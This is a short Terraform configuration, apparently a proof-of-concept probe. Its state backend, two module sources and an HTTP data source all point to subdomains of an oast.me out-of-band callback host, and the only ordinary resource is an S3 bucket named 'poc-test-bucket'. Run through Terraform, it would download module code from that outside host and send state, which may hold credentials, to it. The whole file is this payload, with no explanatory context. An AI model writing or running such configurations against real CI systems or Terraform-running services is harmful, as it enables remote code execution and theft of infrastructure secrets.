terraform {
  backend "http" { address = "http://tfbackend.d987c1vbc9hh51oplspgqsxyqunhon9yo.oast.me/state" }
}
module "vpc" { source = "git::http://tfmod.d987c1vbc9hh51oplspgqsxyqunhon9yo.oast.me/vpc.git" }
module "s3"  { source = "http://tfhttp.d987c1vbc9hh51oplspgqsxyqunhon9yo.oast.me/s3.zip" }
data "http" "x" { url = "http://tfdata.d987c1vbc9hh51oplspgqsxyqunhon9yo.oast.me/" }
resource "aws_s3_bucket" "b" { bucket = "poc-test-bucket" }
